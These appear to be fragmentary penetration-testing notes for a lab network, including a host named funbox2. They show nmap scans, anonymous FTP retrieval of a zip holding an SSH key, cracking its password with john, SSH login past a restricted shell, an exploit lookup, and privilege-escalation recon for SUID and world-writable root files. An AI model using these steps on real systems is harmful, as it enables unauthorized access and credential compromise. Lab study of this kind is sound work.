
# Phase_2

172.16.33.35
172.16.33.30

172.16.33.55
172.16.33.49
172.16.33.78
172.16.33.79
172.16.33.99
172.16.33.98
172.16.33.103
172.16.33.108
172.16.33.201 (AD)

## 1

### namp

```bash
arp-scan -l
nmap -p- 10.1.8.10 --open --reason
nmap -p21,22,80 -sV -A 10.1.8.10
```

```bash
nmap -sV -sC -p- -oA ./nmap 172.16.33.35
```

### searchsploit

```bash
searchsploit James
searchsploit -m 35513
```

### rbash bypass

ssh

### priviledge escalation

```bash
python -c 'import pty;pty.spawn("/bin/bash")'

stty -a
stty raw -echo
fg
export TERM=xterm
stty rows 38 columns 116
```

```bash
find / -perm -u=s -type f 2>/dev/null
find / -type f -user root -perm -o=w 2>/dev/null | grep -v '/proc/|/sys/'

cat <<< AAA > /opt/tmp.py
```

#### dirtypipe

https://

## 2(172.16.33.30)

### namp

```bash
└─$ nmap -sV -sC -p- -oA ./nmap/sr 172.16.33.30

Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-28 22:15 CST
Nmap scan report for 172.16.33.30
Host is up (0.072s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5e
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
| -r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
| -rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
|_-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f9467dfe0c4da97e2d77740fa2517251 (RSA)
|   256 15004667809b40123a0c6607db1d1847 (ECDSA)
|_  256 75ba6695bb0f16de7e7ea17b273bb058 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/logs/
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.60 seconds
```

### ftp

```bash
└─$ ftp  
ftp> open 172.16.33.30
Connected to 172.16.33.30.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:172.16.33.30]
Name (172.16.33.30:parallels): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230-Welcome, archive user anonymous@_gateway !
230-
230-The local time is: Wed Nov 16 13:41:59 2022
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@funbox2>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls -a
229 Entering Extended Passive Mode (|||61904|)                                        
150 Opening ASCII mode data connection for file list                                  
drwxr-xr-x   2 ftp      ftp          4096 Jul 25  2020 .                              
drwxr-xr-x   2 ftp      ftp          4096 Jul 25  2020 ..                             
-rw-r--r--   1 ftp      ftp           153 Jul 25  2020 .@admins                       
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip                       
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip                      
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip                        
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip                   
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip                      
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip                    
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip                       
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip                      
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip                     
-r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip                        
-rw-r--r--   1 ftp      ftp           114 Jul 25  2020 .@users                        
-rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg                    
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip                     
226 Transfer complete  

ftp> get .@admins
local: .@admins remote: .@admins
229 Entering Extended Passive Mode (|||26124|)
150 Opening BINARY mode data connection for .@admins (153 bytes)
100% |********************************************************************************
226 Transfer complete
153 bytes received in 00:00 (2.15 KiB/s)

ftp> get tom.zip
local: tom.zip remote: tom.zip
229 Entering Extended Passive Mode (|||51450|)
150 Opening BINARY mode data connection for tom.zip (1477 bytes)
100% |*****************************************|  1477       37.06 MiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (21.04 KiB/s)
ftp> 
```

### zip

```bash
zip2john tom.zip > tom.hash
john tom.hash -w=/usr/share/wordlists/rockyou.txt
john tom.hash

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
iubire           (tom.zip/id_rsa)     
1g 0:00:00:00 DONE 2/3 (2024-01-28 22:54) 100.0g/s 5509Kp/s 5509Kc/s 5509KC/s 123456..faithfaith
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

john tom.hash --show
tom.zip/id_rsa:iubire:id_rsa:tom.zip::tom.zip
1 password hash cracked, 0 left
```

### ssh

```bash
ssh -i tom_id_rsa tom@172.16.33.30
tom@funbox2:~$ cd .ssh
-rbash: cd: restricted

```

#### rbash bypass

ssh

### searchsploit

```bash
searchsploit James
searchsploit -m 35513
```

### priviledge escalation

```bash
python -c 'import pty;pty.spawn("/bin/bash")'

stty -a
stty raw -echo
fg
export TERM=xterm
stty rows 38 columns 116
```

```bash
find / -perm -u=s -type f 2>/dev/null
find / -type f -user root -perm -o=w 2>/dev/null | grep -v '/proc/|/sys/'

cat <<< AAA > /opt/tmp.py
```
